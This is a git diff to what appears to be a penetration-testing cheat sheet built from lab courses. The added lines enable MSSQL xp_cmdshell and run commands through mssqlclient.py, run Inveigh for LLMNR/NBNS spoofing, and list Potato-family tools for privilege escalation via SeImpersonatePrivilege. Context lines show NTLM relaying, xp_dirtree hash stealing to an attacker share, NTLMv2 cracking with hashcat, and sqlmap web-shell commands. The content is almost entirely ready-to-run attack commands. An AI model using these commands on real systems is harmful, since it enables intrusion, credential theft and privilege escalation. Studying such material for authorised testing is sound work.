@@ -561,7 +561,6 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powersh
 EXECUTE sp_configure 'show advanced options', 1
 EXECUTE sp_configure 'xp_cmdshell', 1
 RECONFIGURE
-xp_cmdshell 'whoami'
 
 # Hash stealing using the xp_dirtree command in MSSQL.
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
@@ -571,6 +570,20 @@ EXEC master..xp_subdirs '\\10.10.110.17\share\'
 
 # Identify the user and its privileges used for the remote connection in MSSQL.
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+
+# mssqlclient.py
+mssqlclient.py INLANEFREIGHT/account@172.16.5.50
+                                                    
+xp_cmdshell
+xp_cmdshell "whoami /priv"
+xp_cmdshell 'whoami'
+
+#iF xp_cmdshell is not enabled:
+EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+
 ```
 ##### Attacking Email Services
 ```
@@ -636,7 +649,10 @@ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 #Inveigh Windows LLMNR and NBNS spoofing
 Import-Module .\Inveigh.ps1
 Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+#Also you can donwload it
 PS C:\htb> .\Inveigh.exe
+GET NTLMV2USERNAMES
 
 ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
 
@@ -966,6 +982,18 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
+
+## SeImpersonatePrivilege PtatoFamily
+```
+#[JuicyPotato](https://github.com/ohpe/juicy-potato)
+#[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+#[RoguePotato](https://github.com/antonioCoco/RoguePotato)
+
+
+
+```
+
+
 ## Useful Resources
 
 [HackTriks](https://book.hacktricks.xyz/)
